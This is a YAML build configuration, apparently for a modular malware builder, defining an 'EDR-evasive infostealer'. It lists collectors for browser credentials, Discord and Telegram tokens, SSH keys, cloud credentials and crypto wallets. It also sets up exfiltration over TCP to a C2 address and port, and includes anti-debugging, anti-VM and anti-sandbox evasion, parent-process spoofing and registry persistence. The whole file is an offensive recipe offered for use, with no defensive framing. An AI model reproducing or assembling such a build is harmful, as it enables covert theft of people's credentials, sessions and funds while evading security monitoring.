name: infostealer_edr_v1
description: EDR-evasive infostealer — PEB walk API resolve, fiber execution, full anti-analysis

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/installed_software
  - collectors/env_vars
  - collectors/clipboard
  - collectors/wifi_passwords
  - collectors/browser_chromium
  - collectors/discord_tokens
  - collectors/telegram_session
  - collectors/ftp_credentials
  - collectors/ssh_keys
  - collectors/cloud_creds
  - collectors/crypto_wallets
  - collectors/screenshot

exfil: exfil/tcp_direct
arch: arch/fiber

api_resolve: api_resolve/peb_walk
process: process/ppid_spoof

resources: true

evasion:
  - evasion/anti_debug
  - evasion/anti_vm
  - evasion/anti_sandbox
  - evasion/sleep_jitter
  - evasion/stack_strings
  - evasion/triggered_exec

persist: persist/registry_run

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
